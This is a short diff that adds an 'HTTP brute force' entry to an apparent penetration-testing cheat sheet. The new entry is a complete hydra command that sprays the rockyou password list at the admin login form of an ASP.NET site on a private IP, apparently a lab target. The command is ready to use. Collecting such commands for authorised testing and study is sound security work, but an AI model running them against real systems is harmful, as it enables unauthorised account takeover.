@@ -408,6 +408,12 @@ SMB brute force:
 hydra -L users.txt -P passwords.txt smb://192.168.1.10
 ```
 
+HTTP brute force:
+
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.130.179.253 -V http-form-post "/Account/login.aspx?ReturnURL=%2fadmin:__VIEWSTATE=P45Wypk72piKZWxwy3Ted1dEvM2VgJHpx4z4LTDJ0BjGZfBFdRMi39kG67h6AEKsTg5qRqcBSByowqP9EUwHMNBmsvOtW%2Fpb50E4qX00X8AYIcj3HQW86iMrDEMtjD6tB7gZY7vO4%2BnJa9f1eVCmxjU0vWfV7Yv7nz%2FfA3vZ5ycF7xKg&__EVENTVALIDATION=XfIwtLpB7cjFJTxk2LIHgcjahhobc5oGH3oBsUpFlp6O0ttiE8VRYfGDpmNOgDO%2FDB1p9gjZwaQmSIaKLR06IKhAyO7OFuHyzuLbzu27Dr22JgZt1rWYrHTB997v%2B7BeisyxU2Gcl7HGx4%2Fe0uBQxPiMxjfn6wQNmy5JE4eCdAAKwSaG&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
+```
+
 ---
 
 # 16. Search for Exploits
